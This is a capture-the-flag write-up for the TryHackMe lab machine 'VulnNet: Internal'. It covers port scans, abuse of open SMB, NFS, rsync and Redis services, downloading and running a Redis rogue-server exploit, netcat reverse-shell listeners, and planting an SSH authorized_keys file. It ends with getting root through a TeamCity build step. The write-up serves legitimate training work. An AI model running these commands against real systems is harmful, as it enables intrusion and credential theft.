---
{"dg-publish":true,"permalink":"/write-ups/try-hack-me/vuln-net-internal/","tags":["CTF","write-up","Sensitive_data_exposure","misconfiguration"]}
---


![Pasted image 20241119134932.png|200](/img/user/attachments/Pasted%20image%2020241119134932.png)

---
> [!INFO] Info about VulnNet - Internal
> VulnNet Entertainment learns from its mistakes, and now they have something new for you...
> 
> This machine was designed to be quite the opposite of the previous machines in this series and it focuses on internal services. It's supposed to show you how you can retrieve interesting information and use it to gain system access. Report your findings by submitting the correct flags.

> [!FAQ]- Hints
> No Hints.

---
# Active reconnaissance
## Port scan
Executing a fast general scan to all ports.
```shell
sudo nmap TARGET_IP -n -p- -sS -Pn -vvv --open --min-rate 5000 -oN nmap_scan
```

```c
PORT      STATE SERVICE      REASON
22/tcp    open  ssh          syn-ack ttl 61
111/tcp   open  rpcbind      syn-ack ttl 61
139/tcp   open  netbios-ssn  syn-ack ttl 61
445/tcp   open  microsoft-ds syn-ack ttl 61
873/tcp   open  rsync        syn-ack ttl 61
2049/tcp  open  nfs          syn-ack ttl 61
6379/tcp  open  redis        syn-ack ttl 61
36557/tcp open  unknown      syn-ack ttl 61
54381/tcp open  unknown      syn-ack ttl 61
55305/tcp open  unknown      syn-ack ttl 61
58151/tcp open  unknown      syn-ack ttl 61
```

---
# Enumeration
Executing a deep scan with common scripts only to ports that we are interested.
```shell
sudo nmap TARGET_IP -sCV -p 22,111,139,445,873,2049,6379,36557,54381,55305,58151 -oN nmap_enum
```
## OS
Ubuntu 18.04 LTS
Linux Ubuntu
Host: VULNNET-INTERNAL
## Port 22 SSH
**OpenSSH 7.6p1** Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

## Port 139 Netbios
**netbios-ssn Samba** smbd 3.X - 4.X (workgroup: WORKGROUP)

## Port 445 Samba
Netbios-ssn **Samba smbd 4.7.6-Ubuntu** (workgroup: WORKGROUP)

smb2-time
OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
Computer name: vulnnet-internal
NetBIOS computer name: VULNNET-INTERNAL\x00
Domain name: \x00
FQDN: vulnnet-internal

nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <>, NetBIOS MAC: <> (unknown)

smb-security-mode:
account_used: guest
authentication_level: user
challenge_response: supported
message_signing: disabled (dangerous, but default)

smb2-security-mode:
3:1:1:
Message signing enabled but not required

**From  enum4linux**
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
```ruby
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-21-1569020563-4280465252-527208056 and logon username '', password ''
S-1-5-21-1569020563-4280465252-527208056-501 VULNNET-INTERNAL\nobody (Local User)
S-1-5-21-1569020563-4280465252-527208056-513 VULNNET-INTERNAL\None (Domain Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\sys-internal (Local User)
```
## Port 111 RPC
rpcbind 2-4 (RPC #100000)
```shell
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      36742/udp6  mountd
|   100005  1,2,3      46683/udp   mountd
|   100005  1,2,3      58151/tcp   mountd
|   100005  1,2,3      59759/tcp6  mountd
|   100021  1,3,4      34914/udp6  nlockmgr
|   100021  1,3,4      36557/tcp   nlockmgr
|   100021  1,3,4      42483/udp   nlockmgr
|   100021  1,3,4      46639/tcp6  nlockmgr
```
## Port 2049 NFS
**nfs 3-4** (RPC #100003)

Check mopunts
```shell
showmount -e 10.10.85.198
```
![Pasted image 20241119161045.png](/img/user/attachments/Pasted%20image%2020241119161045.png)

## Port 54381 mountd
mountd      1-3 (RPC #100005)
## Port 54305 mountd
mountd      1-3 (RPC #100005)
## Port 54151 mountd
mountd      1-3 (RPC #100005)
## Port 36557 nlockmgr
nlockmgr    1-4 (RPC #100021)
## Port 873 Rsync
**rsync** (protocol version **31**)
The rsync service has modules available
![Pasted image 20241121105913.png](/img/user/attachments/Pasted%20image%2020241121105913.png)
## Port 6379 Redis
redis       Redis key-value store
# Vulnerability analysis
## Port 445 Samba
The service are running shares to a null session
```shell
smbmap -H 10.10.133.88 -u NULL
```

With null session we have
 ![Pasted image 20241119143943.png](/img/user/attachments/Pasted%20image%2020241119143943.png)
## Port 2049 NFS
**nfs 3-4** (RPC #100003)

Check mounts
```shell
showmount -e 10.10.85.198
```
![Pasted image 20241119161045.png](/img/user/attachments/Pasted%20image%2020241119161045.png)
## Port 6379 Redis
## Port 873 Rsync
Exposed resources to connect
![Pasted image 20241120181056.png|400](/img/user/attachments/Pasted%20image%2020241120181056.png)

---
# Exploitation
## Samba - Sensitive data exposure
Connect to the share
```shell
smbclient //10.10.133.88/shares -N
```

We are connected

> [!check] What is the services flag? (services.txt)
> Change to the temp folder and download the file
> ![Pasted image 20241119144337.png](/img/user/attachments/Pasted%20image%2020241119144337.png)

## NFS - Misconfiguration
Mount the NFS share (`/opt/conf`)to our machine (`/tmp/nfs`), the creation of `nfs` folder is required.
```shell
 sudo mount -t nfs 10.10.85.198:/opt/conf /tmp/nfs -nolock
```

Navegate to the folder `/tmp/nfs` on the  local machine
We can  see the a redis folder
![Pasted image 20241119172039.png](/img/user/attachments/Pasted%20image%2020241119172039.png)

Looking for credentials of redis.

We found a password of Redis
![Pasted image 20241119172450.png](/img/user/attachments/Pasted%20image%2020241119172450.png)
## Redis - Dump database
Connect
```shell
redis-cli -h 10.10.85.198 -p 6379
```

Authenticate (Use the password from above)
```shell
AUTH B65******
```
Since we don't have the username, try to connect with the default username `AUTH PASSWORD`
![Pasted image 20241119192021.png](/img/user/attachments/Pasted%20image%2020241119192021.png)
The `ok` means that it works

List databases
```
INFO keyspace
```
There is one database `db0`
![Pasted image 20241119193043.png](/img/user/attachments/Pasted%20image%2020241119193043.png)
Show the content of it and we can get a flag.
> [!check] What is the internal flag? ("internal flag")
> ![Pasted image 20241119193342.png](/img/user/attachments/Pasted%20image%2020241119193342.png)

Furthermore, we have a list type item named `authlist`
Show it
![Pasted image 20241121105147.png](/img/user/attachments/Pasted%20image%2020241121105147.png)
We have an apparently a base 64 code. Try to decode it.
![Pasted image 20241121105342.png](/img/user/attachments/Pasted%20image%2020241121105342.png)
We found information to authenticate to the **rsync** service
## Redis - RCE (FAIL)
```shell
wget https://raw.githubusercontent.com/n0b0dyCN/redis-rogue-server/refs/heads/master/redis-rogue-server.py
wget https://raw.githubusercontent.com/n0b0dyCN/redis-rogue-server/refs/heads/master/exp.so
```

Before execute the exploit we need to start a listener on our machine
```shell
rlwrap nc -lnvp 4747
```

Now run the exploit
```shell
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP> --passwd B6*****
```
![Pasted image 20241120110420.png|600](/img/user/attachments/Pasted%20image%2020241120110420.png)

It works, on our machine, the listener receives the reverse shell, and we are logged as the user `redis`
![Pasted image 20241120110457.png](/img/user/attachments/Pasted%20image%2020241120110457.png)

> [!Fail] Warning
> At this point, I enumerate the system to get a root shell, but it is not possible. So I continue to the following **Rsync - Connecting** section.
> I found services listening by only local host but trying to make a port forwarding, the `Redis` user doesn't have enough permissions to connect via SSH.
## Rsync - Connecting
With the credentials of rsync, try to connect.
Specifically, **list** `files` resource
```shell
rsync -av --list-only rsync://rsync-connect@10.10.137.165/files
```
![Pasted image 20241121141347.png|600](/img/user/attachments/Pasted%20image%2020241121141347.png)
**Download** them into my `/tmp/files` folder
```shell
rsync -av rsync://username@192.168.0.123:8730/shared_name /tmp/files
```
![Pasted image 20241121141814.png|600](/img/user/attachments/Pasted%20image%2020241121141814.png)

Now the files has been downloaded to my `/tmp/folder`
We can maneuver into the files.
> [!check] User flag
> Get the flag
> ![Pasted image 20241121142238.png](/img/user/attachments/Pasted%20image%2020241121142238.png)

Also, we can upload files, and we can leverage to gain a SSH connection.
## SSH - Connecting
Before proceed, I suggest getting a firm grasp about SSH connections, you are encouraged to review my SSH notes here [[Notes/SSH#Method 1\|SSH#Method 1]], I am trying the method 1.
I will try to copy the `authorized_keys` from my machine to the `.ssh` folder on the target machine.
```shell
rsync -av /home/kali/.ssh/test/authorized_keys rsync://rsync-connect@10.10.137.165/files/sys-internal/.ssh
```
![Pasted image 20241121150153.png|800](/img/user/attachments/Pasted%20image%2020241121150153.png)
Now, we can connect without introduce the password of `sys-internal`.
```shell
ssh sys-internal@10.10.137.165
```
![Pasted image 20241121153340.png](/img/user/attachments/Pasted%20image%2020241121153340.png)

> [!info]- Important
>  At this point, we could escalate to root via [[CVE-2021-4034\|CVE-2021-4034]], but I'm going to continue on the machine's intended path.
## SSH - Port forwarding
According to the information obtained from local enumeration, we know that the system is running services only readable by the localhost.
![Pasted image 20241121155411.png](/img/user/attachments/Pasted%20image%2020241121155411.png)
53 is assigned to DNS, 631 is assigned to the CUPS so we are interested on the three left.
We can do it for all of them (3)
E.g. For the 55401
```shell
ssh sys-internal@10.10.137.165 -L 55401:127.0.0.1:55401
```
## Enumeration
After mount the 3 services
Enumerate it
```shell
sudo nmap 127.0.0.1 -sCV -p 55401,8105,8111
```
The results:
```c
PORT      STATE SERVICE     VERSION
8105/tcp  open  unknown
8111/tcp  open  skynetflow?
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 401
|     TeamCity-Node-Id: MAIN_SERVER
|     WWW-Authenticate: Basic realm="TeamCity"
|     WWW-Authenticate: Bearer realm="TeamCity"
55401/tcp open  java-rmi    Java RMI
| rmi-dumpregistry:
|   teamcity-mavenServer
|      implements jetbrains.buildServer.maven.remote.MavenServer,
|     extends
|       java.lang.reflect.Proxy
|       fields
|           Ljava/lang/reflect/InvocationHandler; h
|             java.rmi.server.RemoteObjectInvocationHandler
|             @127.0.0.1:40065
```
### Port 8111 TeamCity
Both, the port 8111 and 55401 are related to TeamCity.
Furthermore, the 8111 are responding through HTTP
![Pasted image 20241121170434.png|400](/img/user/attachments/Pasted%20image%2020241121170434.png)
Check on the browser the page is show up.
![Pasted image 20241121170713.png|600](/img/user/attachments/Pasted%20image%2020241121170713.png)
If we login again through SSH we found in the system the folder `/TeamCity` related with this service and looking for interesting files I found a few tokens in the *log* folder:
```shell
grep -ir token . 2>/dev/null
```
![Pasted image 20241122092730.png](/img/user/attachments/Pasted%20image%2020241122092730.png)
We can use it to login into the admin panel.
#### Login
Insert the last token in the password field and login in:
![Pasted image 20241122093342.png|500](/img/user/attachments/Pasted%20image%2020241122093342.png)
![Pasted image 20241122093531.png|500](/img/user/attachments/Pasted%20image%2020241122093531.png)
#### Getting access
After this I realized that TeamCity's owner is root, so it's running as root.
![Pasted image 20241122104153.png|600](/img/user/attachments/Pasted%20image%2020241122104153.png)
Also navigating to the admin panel of TeamCity
Go to `Agents` -> `Default Agent` -> `Agent parameters` -> `Environment Variables`
I confirm that root is running TeamCity
![Pasted image 20241122104828.png|600](/img/user/attachments/Pasted%20image%2020241122104828.png)
This fact it's important because if we can execute commands on the target system, we will do it like a root.
Checking the build runners, show some ways to interact with the system, the most convenient to our proposes is `python`
![Pasted image 20241122111307.png|500](/img/user/attachments/Pasted%20image%2020241122111307.png)
Now go to the projects and create a project (Ge0 in this case).
Login to the project and create a built (built1 in this case).
Select the built and select `edit configuration setting`
![Pasted image 20241122111907.png](/img/user/attachments/Pasted%20image%2020241122111907.png)
Click on `Build Step` on the left panel
And `add built step` bottom
Create the step selecting python and add the revershell code.
![Pasted image 20241122112039.png](/img/user/attachments/Pasted%20image%2020241122112039.png)
Save the step on the blue bottom

Start a listener on the attacker machine
```shell
rlwrap nc -lnvp 4747
```

And finally run.
![Pasted image 20241122112209.png](/img/user/attachments/Pasted%20image%2020241122112209.png)

We are root
![Pasted image 20241122112328.png](/img/user/attachments/Pasted%20image%2020241122112328.png)

And get the flag

> [!check] root flag
> ![Pasted image 20241122112457.png](/img/user/attachments/Pasted%20image%2020241122112457.png)